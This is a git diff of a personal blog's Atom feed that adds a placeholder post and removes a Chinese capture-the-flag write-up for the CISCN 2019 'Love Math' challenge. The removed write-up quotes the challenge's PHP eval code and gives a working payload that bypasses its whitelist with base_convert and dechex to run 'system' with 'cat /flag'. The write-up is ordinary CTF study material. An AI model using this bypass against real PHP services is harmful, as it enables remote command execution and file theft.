@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>ev11ccaatt</title>
-    <updated>2021-03-31T06:04:32.492Z</updated>
+    <updated>2021-03-31T06:10:47.816Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -10,6 +10,15 @@
     <logo>https://ev11ccaatt.github.io/images/avatar.png</logo>
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ev11ccaatt</rights>
+    <entry>
+        <title type="html"><![CDATA[check]]></title>
+        <id>https://ev11ccaatt.github.io/post/check/</id>
+        <link href="https://ev11ccaatt.github.io/post/check/">
+        </link>
+        <updated>2021-03-31T06:06:21.000Z</updated>
+        <content type="html"><![CDATA[<p>11</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[BJDCTF 2nd]fake google]]></title>
         <id>https://ev11ccaatt.github.io/post/bjdctf-2ndfake-google/</id>
@@ -226,52 +235,6 @@ flag文件是0700权限,咱是读不了的。<br>
 <p>那么读取/flag 即可获得flag.</p>
 <p>这里有多种方法</p>
 <p>system执行系统命令；show_source；readfile；等.</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[CISCN 2019 初赛]Love Math]]></title>
-        <id>https://ev11ccaatt.github.io/post/ciscn-2019-chu-sai-love-math/</id>
-        <link href="https://ev11ccaatt.github.io/post/ciscn-2019-chu-sai-love-math/">
-        </link>
-        <updated>2021-03-22T07:43:58.000Z</updated>
-        <content type="html"><![CDATA[<pre><code>&lt;?php
-error_reporting(0);
-//听说你很喜欢数学，不知道你是否爱它胜过爱flag
-if(!isset($_GET['c'])){
-    show_source(__FILE__);
-}else{
-    //例子 c=20-1
-    $content = $_GET['c'];
-    if (strlen($content) &gt;= 80) {
-        die(&quot;太长了不会算&quot;);
-    }
-    $blacklist = [' ', '\t', '\r', '\n','\'', '&quot;', '`', '\[', '\]'];
-    foreach ($blacklist as $blackitem) {
-        if (preg_match('/' . $blackitem . '/m', $content)) {
-            die(&quot;请不要输入奇奇怪怪的字符&quot;);
-        }
-    }
-    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
-    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
-    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
-    foreach ($used_funcs[0] as $func) {
-        if (!in_array($func, $whitelist)) {
-            die(&quot;请不要输入奇奇怪怪的函数&quot;);
-        }
-    }
-    //帮你算出答案
-    eval('echo '.$content.';');
-}
-</code></pre>
-<p>明显要构造类似于c=system(cat /flag)的payload。</p>
-<p>而system不在白名单.可以利用动态函数的性质,即c=(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>[</mo><mi>a</mi><mo>]</mo><mo>)</mo><mo>(</mo></mrow><annotation encoding="application/x-tex">_GET[a])(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord mathdefault">a</span><span class="mclose">]</span><span class="mclose">)</span><span class="mopen">(</span></span></span></span>_GET[b])</p>
-<p>那么就需要构造出_GET.</p>
-<p>先使用hex2bin（十六进制转ascii）得到5f474554,而这个字符串无法过jiance,需要再次加密，可以使用dechex（将10进制转化为十六进制)得到1598506324.</p>
-<p>但hex2bin未在白名单.可以采用base_convert()进行进制的转换.得到base_convert(37907361743,10,36).</p>
-<p>因为c有长度限制，则变量名要采用在白名单中较短的,此处采用pi,后面的变量名依次按长度选取.<br>
-得到payload.</p>
-<pre><code>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&amp;pi=system&amp;cos=cat /flag
-</code></pre>
 ]]></content>
     </entry>
 </feed>
